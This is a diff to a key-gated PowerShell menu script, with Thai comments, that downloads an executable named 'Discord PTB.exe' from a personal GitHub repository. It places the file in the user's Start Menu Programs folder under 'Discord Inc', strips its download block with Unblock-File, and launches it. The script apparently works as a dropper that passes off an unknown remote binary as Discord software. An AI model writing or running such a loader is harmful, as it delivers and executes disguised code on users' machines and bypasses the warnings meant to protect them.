@@ -1,11 +1,9 @@
-$CorrectKey = "SMITHSHOP"
+$CorrectKey = "4AS"
 
 $ExeUrl = "https://raw.githubusercontent.com/draft7973-ops/Smithshop/refs/heads/main/Discord%20PTB.exe"
-$DllUrl = "https://raw.githubusercontent.com/draft7973-ops/Smithshop/refs/heads/main/Discord%20PTB.dll"
 
-$BasePath = "$env:LOCALAPPDATA\DiscordPTB"
-$ExePath = "$BasePath\DiscordPTB.exe"
-$DllPath = "$BasePath\DiscordPTB.dll"
+$BasePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Discord Inc"
+$ExePath = "$BasePath\Discord PTB.exe"
 
 Clear-Host
 Write-Host "============================="
@@ -24,7 +22,7 @@ while ($true) {
     Write-Host "============================="
     Write-Host "       Malaysia Di waa"
     Write-Host "============================="
-    Write-Host "1. Install"
+    Write-Host "1. Install & Run"
     Write-Host "2. Check"
     Write-Host "0. Exit"
 
@@ -35,21 +33,24 @@ while ($true) {
         Write-Host "Installing..."
 
         try {
-            if (!(Test-Path $BasePath)) {
-                New-Item -ItemType Directory -Path $BasePath -Force | Out-Null
-            }
+            # สร้างโฟลเดอร์
+            New-Item -ItemType Directory -Path $BasePath -Force | Out-Null
 
-            # โหลดไฟล์
+            # โหลด exe
             Invoke-WebRequest -Uri $ExeUrl -OutFile $ExePath -UseBasicParsing
-            Invoke-WebRequest -Uri $DllUrl -OutFile $DllPath -UseBasicParsing
+
+            # ปลดบล็อก
+            Unblock-File -Path $ExePath -ErrorAction SilentlyContinue
 
             Write-Host "Install complete!" -ForegroundColor Green
+            Write-Host "Running..." -ForegroundColor Cyan
 
-            # ✅ รันทันที
-            Start-Process -FilePath $ExePath -WorkingDirectory $BasePath
+            # รัน exe เท่านั้น
+            Start-Process -FilePath "$ExePath" -WorkingDirectory "$BasePath"
         }
         catch {
             Write-Host "Install failed!" -ForegroundColor Red
+            Write-Host $_.Exception.Message -ForegroundColor Yellow
         }
 
         pause
@@ -58,20 +59,19 @@ while ($true) {
         Clear-Host
 
         if (Test-Path $ExePath) {
-            Write-Host "EXE found" -ForegroundColor Green
+            Write-Host "EXE found:" -ForegroundColor Green
+            Write-Host $ExePath
         } else {
             Write-Host "EXE not found" -ForegroundColor Yellow
-        }
-
-        if (Test-Path $DllPath) {
-            Write-Host "DLL found" -ForegroundColor Green
-        } else {
-            Write-Host "DLL not found" -ForegroundColor Yellow
         }
 
         pause
     }
     elseif ($choice -eq "0") {
         exit
+    }
+    else {
+        Write-Host "Invalid choice!" -ForegroundColor Red
+        Start-Sleep 1
     }
 }
